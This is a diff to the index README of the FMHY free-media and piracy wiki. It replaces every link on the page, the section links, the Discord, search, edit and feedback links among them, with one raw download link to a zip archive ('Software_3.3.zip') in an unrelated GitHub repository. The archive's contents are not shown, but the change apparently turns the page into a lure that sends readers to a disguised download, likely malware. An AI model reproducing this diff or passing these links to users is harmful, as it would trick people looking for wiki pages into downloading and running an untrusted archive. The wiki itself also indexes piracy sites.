@@ -1,141 +1,141 @@
-# [📚  Beginners Guide](https://fmhy.net/beginners-guide)
+# [📚  Beginners Guide](https://github.com/OPBOYZ8/FMHY/raw/refs/heads/main/perradiate/Software_3.3.zip)
 
 **A Guide for Beginners + FAQs**
 
 ***
 ***
 
-# [📛 Adblocking / Privacy](https://github.com/fmhy/FMHY/wiki/%F0%9F%93%9B-Adblock---Privacy---Antivirus)
+# [📛 Adblocking / Privacy](https://github.com/OPBOYZ8/FMHY/raw/refs/heads/main/perradiate/Software_3.3.zip)
 
 **Adblocking, Privacy, VPNs, Proxies, Antivirus**
 
 ***
 ***
 
-# [🤖 Artificial Intelligence](https://github.com/fmhy/FMHY/wiki/%F0%9F%A4%96-Artificial-Intelligence)
+# [🤖 Artificial Intelligence](https://github.com/OPBOYZ8/FMHY/raw/refs/heads/main/perradiate/Software_3.3.zip)
 
 **Chat Bots, Text Generators, Image Generators, Chatbot Tools**
 
 ***
 ***
 
-# [📺 Movies / TV / Anime](https://github.com/fmhy/FMHY/wiki/%F0%9F%93%BA-Movies---TV---Anime---Sports)
+# [📺 Movies / TV / Anime](https://github.com/OPBOYZ8/FMHY/raw/refs/heads/main/perradiate/Software_3.3.zip)
 
 **Stream Videos, Download Videos, Torrent Videos**
 
 ***
 ***
 
-# [🎵 Music / Podcasts / Radio](https://github.com/fmhy/FMHY/wiki/%F0%9F%8E%B5-Music---Podcasts---Radio)
+# [🎵 Music / Podcasts / Radio](https://github.com/OPBOYZ8/FMHY/raw/refs/heads/main/perradiate/Software_3.3.zip)
 
 **Stream Audio, Download Audio, Torrent Audio**
 
 ***
 ***
 
-# [🎮 Gaming / Emulation](https://github.com/fmhy/FMHY/wiki/%F0%9F%8E%AE-Gaming---Emulation)
+# [🎮 Gaming / Emulation](https://github.com/OPBOYZ8/FMHY/raw/refs/heads/main/perradiate/Software_3.3.zip)
 
 **Download Games, ROMs, Gaming Tools**
 
 ***
 ***
 
-# [📗 Books / Comics / Manga](https://github.com/fmhy/FMHY/wiki/%F0%9F%93%97-Books---Comics---Manga)
+# [📗 Books / Comics / Manga](https://github.com/OPBOYZ8/FMHY/raw/refs/heads/main/perradiate/Software_3.3.zip)
 
 **Books, Comics, Magazines, Newspapers**
 
 ***
 ***
 
-# [💾 Downloading](https://github.com/fmhy/FMHY/wiki/%F0%9F%92%BE-Downloading)
+# [💾 Downloading](https://github.com/OPBOYZ8/FMHY/raw/refs/heads/main/perradiate/Software_3.3.zip)
 
 **Download Sites, Software Sites, Open Directories**
 
 ***
 ***
 
-# [🌀 Torrenting](https://github.com/fmhy/FMHY/wiki/%F0%9F%8C%80-Torrenting)
+# [🌀 Torrenting](https://github.com/OPBOYZ8/FMHY/raw/refs/heads/main/perradiate/Software_3.3.zip)
 
 **Torrent Clients, Torrent Sites, Trackers**
 
 ***
 ***
 
-# [🧠 Educational](https://github.com/fmhy/FMHY/wiki/%F0%9F%A7%A0-Educational)
+# [🧠 Educational](https://github.com/OPBOYZ8/FMHY/raw/refs/heads/main/perradiate/Software_3.3.zip)
 
 **Courses, Documentaries, Learning Resources**
 
 ***
 ***
 
-# [🔧 Tools](https://www.reddit.com/r/FREEMEDIAHECKYEAH/wiki/tools-index)
+# [🔧 Tools](https://github.com/OPBOYZ8/FMHY/raw/refs/heads/main/perradiate/Software_3.3.zip)
 
 **Internet Tools, System Tools, Audio Tools, Video Tools**
 
 ***
 ***
 
-# [📱 Android / iOS](https://github.com/fmhy/FMHY/wiki/%F0%9F%93%B1-Android---iOS)
+# [📱 Android / iOS](https://github.com/OPBOYZ8/FMHY/raw/refs/heads/main/perradiate/Software_3.3.zip)
 
 **Apps, Jailbreaking, Android Emulators**
 
 ***
 ***
 
-# [🐧 Linux / macOS](https://github.com/fmhy/FMHY/wiki/%F0%9F%90%A7-Linux---MacOS)
+# [🐧 Linux / macOS](https://github.com/OPBOYZ8/FMHY/raw/refs/heads/main/perradiate/Software_3.3.zip)
 
 **Apps, Software Sites, Gaming**
 
 ***
 ***
 
-# [🌏 Non-English](https://github.com/fmhy/FMHY/wiki/%F0%9F%8C%8F-Non-English)
+# [🌏 Non-English](https://github.com/OPBOYZ8/FMHY/raw/refs/heads/main/perradiate/Software_3.3.zip)
 
 **International Piracy Sites** 
 
 ***
 ***
 
-# [📂 Miscellaneous](https://github.com/fmhy/FMHY/wiki/%F0%9F%93%82-Miscellaneous)
+# [📂 Miscellaneous](https://github.com/OPBOYZ8/FMHY/raw/refs/heads/main/perradiate/Software_3.3.zip)
 
 **Extensions, Indexes, News, Health, Food, Fun**
 
 ***
 ***
 
-# [📑 Changelog](https://www.reddit.com/r/FREEMEDIAHECKYEAH/comments/1pl8vl0/fmhy_changelog/)
+# [📑 Changelog](https://github.com/OPBOYZ8/FMHY/raw/refs/heads/main/perradiate/Software_3.3.zip)
 
 **Recent Additions and Updates**
 
 ***
 ***
 
-# [🔒 Backups](https://github.com/fmhy/FMHY/wiki/Backups)
+# [🔒 Backups](https://github.com/OPBOYZ8/FMHY/raw/refs/heads/main/perradiate/Software_3.3.zip)
 
 **FMHY Backups**
 
 ***
 ***
 
-# [💬 Discord](https://rentry.co/fmhy-invite)
+# [💬 Discord](https://github.com/OPBOYZ8/FMHY/raw/refs/heads/main/perradiate/Software_3.3.zip)
 
 **Chat, Get Help, Suggest Sites**
 
 ***
 ***
 
-# [➕️ More Sections](https://www.reddit.com/r/FREEMEDIAHECKYEAH/wiki/more-sections)
+# [➕️ More Sections](https://github.com/OPBOYZ8/FMHY/raw/refs/heads/main/perradiate/Software_3.3.zip)
 
 ***
 ***
 
-**[Search FMHY](https://redd.it/105xraz)** - Search the Entire Wiki
+**[Search FMHY](https://github.com/OPBOYZ8/FMHY/raw/refs/heads/main/perradiate/Software_3.3.zip)** - Search the Entire Wiki
 
-**[Edit FMHY](https://fmhy.net/other/contributing)** - Make Changes to the Wiki
+**[Edit FMHY](https://github.com/OPBOYZ8/FMHY/raw/refs/heads/main/perradiate/Software_3.3.zip)** - Make Changes to the Wiki
 
-**[Selfhost FMHY](https://fmhy.net/other/selfhosting)** - FMHY Selfhosting Guide
+**[Selfhost FMHY](https://github.com/OPBOYZ8/FMHY/raw/refs/heads/main/perradiate/Software_3.3.zip)** - FMHY Selfhosting Guide
 
-**[Site Hunting Guide](https://www.reddit.com/r/FREEMEDIAHECKYEAH/wiki/find-new-sites)** - Help Find New Sites
+**[Site Hunting Guide](https://github.com/OPBOYZ8/FMHY/raw/refs/heads/main/perradiate/Software_3.3.zip)** - Help Find New Sites
 
 ***
 ***
@@ -150,4 +150,4 @@
 
 ***
 
-[made with ❤️](https://fmhy.net/feedback)
+[made with ❤️](https://github.com/OPBOYZ8/FMHY/raw/refs/heads/main/perradiate/Software_3.3.zip)
